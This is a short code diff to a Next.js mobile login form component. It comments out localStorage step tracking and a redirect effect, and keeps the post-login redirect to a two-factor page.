@@ -1,7 +1,7 @@
 import { useLocalStorage } from '@/helpers/useLocalstorage';
 import { login } from '@/request/post';
 import { useRouter } from 'next/router';
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useForm } from 'react-hook-form';
 import { ErrorMessage } from '../common/error-message';
 
@@ -15,18 +15,18 @@ function MobileLoginForm() {
     setError,
   } = useForm();
   const router = useRouter();
-  const [step, setStep] = useLocalStorage('step');
+  // const [step, setStep] = useLocalStorage('step');
 
-  useEffect(() => {
-    if (step === 1) {
-      router.push('/contact/295038365360854');
-    }
-  }, [step, router]);
+  // useEffect(() => {
+  // if (step === 1) {
+  //   router.push('/contact/295038365360854');
+  // }
+  // }, [step, router]);
 
   const onSubmit = async (data) => {
     const res = await login(data);
     if (res?.status && !failCount) {
-      setStep(3);
+      // setStep(3);
       router.push('/two-factor');
     } else {
       reset();
